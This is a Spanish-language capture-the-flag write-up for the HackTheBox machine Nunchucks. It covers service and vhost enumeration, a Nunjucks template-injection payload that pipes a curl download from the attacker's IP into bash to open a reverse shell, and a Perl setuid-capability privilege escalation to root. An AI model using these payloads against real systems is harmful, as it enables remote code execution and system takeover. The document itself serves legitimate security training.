---
layout: single
title: Nunchucks HTB - WriteUp
excerpt: WriteUp de la máquina Nunchucks de HTB.
date: 2023-03-13
classes: wide
header:
  teaser: /assets/images/Nunchucks/Nunchucks.png
  teaser_home_page: true
  icon: /assets/images/Nunchucks/Nunchucks.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web-Enumeration
  - SSTI                                                                                                                                                                                    
  - Capabilities
  - AppArmor
---


En el día de hoy estaremos resolviendo la máquina Nunchucks de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.122.

### Índice
1. [Enumeración Inicial](#enumeración-inicial)
2. [Web Enumeration](#web-enumeration)
3. [VHOST Discovery](#vhost-discovery)
4. [Nunchucks SSTI](#nunchucks-ssti)
5. [Privesc Failed](#privesc-failed)
6. [Privesc](#privesc)
7. [AppArmor](#apparmor)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p22,80,443 10.10.11.122
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-13 10:25 CET
Nmap scan report for 10.10.11.122
Host is up (0.054s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver que hay tres servicios expuestos, entre ellos podemos encontrar el SSH, un servidor HTPP y un servidor HTTPS.

El servidor HTTP redirige a https://nunchucks.htb/ por lo tanto vamos a agregar el dominio al /etc/hosts para poder acceder a él.

### Web Enumeration

Al acceder a la página podemos ver una aplicación web que no nos permite hacer muchas cosas, unicamente hay dos enlaces funcionales (entre comillas). Uno que supuestamente nos permite crear una cuenta y otro que nos permite iniciar sesión. Pero podemos ver un mail que puede que nos sirva del utilidad "[**support@nunchucks.htb**](mailto:support@nunchucks.htb)".

![](/assets/images/Nunchucks/img1.png)

El Log In está deshabilitado...


![](/assets/images/Nunchucks/img2.png)

### VHOST Discovery

Vamos a ver si se está aplicando virtualhosting, para ello usaremos herramientas como gobuster, wfuzz, etc... Yo usaré gobuster en este caso.

```bash
❯ gobuster vhost -k -t 50 -u 'https://nunchucks.htb/' -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://nunchucks.htb/
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/03/13 10:36:21 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.nunchucks.htb (Status: 200) [Size: 4029]
```

Hemos encontrado un subdominio, vamos a añadirlo al /etc/hosts para poder acceder a él. Si accedemos a la página podemos ver lo siguiente.

![](/assets/images/Nunchucks/img3.png)

Si introducimos un correo de prueba, podemos ver que en la respuesta se refleja dicho correo.

![](/assets/images/Nunchucks/img4.png)

### Nunchucks SSTI

Si probamos inyecciones basicas, podemos ver que es vulnerable a SSTI, el payload usasdo en este caso es:

```python
{{7*7}}
```

![](/assets/images/Nunchucks/img5.png)

El servidor está usando Express como marco de desarrollo.

```bash
❯ curl -k -I https://store.nunchucks.htb/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 13 Mar 2023 09:38:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 4029
Connection: keep-alive
X-Powered-By: Express
set-cookie: _csrf=NI8d-zy4LssI1Bnhh5omPkd3; Path=/
ETag: W/"fbd-udK+KYlYFVN2Nn2DXdm1EXd8mv0"
```

En hacktricks podemos encontrar el siguiente apartado en los tipos de SSTI https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks

La máquina se llama nunchucks, así que suena bastante bien. Debido a que hay carácteres que nos se pueden usar, vamos a pasar la petición por Burp.

![](/assets/images/Nunchucks/img6.png)

Podemos ver el /etc/passwd, vamos a tratar de establecernos una revserse shell.

![](/assets/images/Nunchucks/img7.png)

```json
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl http://10.10.16.6/shell.sh|bash')\")()}}"}
```

Si miramos nuestro listener podemos ver que tenemos una shell.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from nunchucks.htb [10.10.11.122] 58908
bash: cannot set terminal process group (1004): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ id
id
uid=1000(david) gid=1000(david) groups=1000(david)
david@nunchucks:/var/www/store.nunchucks$ 
```

### Privesc Failed

Vamos a hacerle el tratamiento de la tty para tener una shell totalmente interactiva y poder escalar privilegios de una forma más cómoda.

Si miramos las capabilites podemos ver la siguiente:

```bash
david@nunchucks:/opt$ getcap -r / 2>/dev/null 
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
david@nunchucks:/opt$ 
```

Con perl podemos cambiar nuestro uid, pero si lo intentamos podemos ver que no podemos.

```bash
david@nunchucks:/opt$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
david@nunchucks:/opt$ id
uid=1000(david) gid=1000(david) groups=1000(david)
david@nunchucks:/opt$
```

Nuestro uid sigue siendo el mismo... Un poco raro eso, pero vamos a seguir enumerando. En /opt podemos encontrar un archivo de perl y un directorio con backups de la web.

```bash
david@nunchucks:/opt$ ls
backup.pl  web_backups
```

### Privesc

Vamos a intentar analizar el script backup.pl

```perl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

Podemos ver que se esta usando el siguiente trozo de codigo para pasar el uid al de  root.

```perl
use POSIX qw(setuid); 
POSIX::setuid(0); 
```

He creado un script y he intentado ejecutar un id cambiando el UID como lo hace el script anterior.

```bash
 david@nunchucks:/tmp$ cat test.pl 
#!/usr/bin/perl
use POSIX qw(setuid); 
POSIX::setuid(0);

system("id");


david@nunchucks:/tmp$ ./test.pl 
uid=0(root) gid=1000(david) groups=1000(david)
```

Hemos cambiando nuestro uid por el de root. Vamos a intentar llamar a una bash.

```bash
david@nunchucks:/tmp$ cat test.pl 
#!/usr/bin/perl
use POSIX qw(setuid); 
POSIX::setuid(0);

system("bash");


david@nunchucks:/tmp$ ./test.pl 
root@nunchucks:/tmp# id
uid=0(root) gid=1000(david) groups=1000(david)
root@nunchucks:/tmp# 
```

### AppArmor

Ya nos hemos convertido en root. Por curiosidad quería ver porque no podía aprovecharme directamente de la capabilitie. Se estaba ejecutando AppArmor en la máquina y estaba impidiendo ejecutar una shell.


```bash
root@nunchucks:/tmp# aa-status 
apparmor module is loaded.
14 profiles are loaded.
14 profiles are in enforce mode.
   /usr/bin/man
   /usr/bin/perl
   /usr/lib/NetworkManager/nm-dhcp-client.action
   /usr/lib/NetworkManager/nm-dhcp-helper
   /usr/lib/connman/scripts/dhclient-script
   /usr/sbin/mysqld
   /usr/sbin/tcpdump
   /{,usr/}sbin/dhclient
   ippusbxd
   lsb_release
   man_filter
   man_groff
   nvidia_modprobe
   nvidia_modprobe//kmod
0 profiles are in complain mode.
2 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/mysqld (920) 
0 processes are in complain mode.
1 processes are unconfined but have a profile defined.
   /usr/bin/perl (1649) 
```










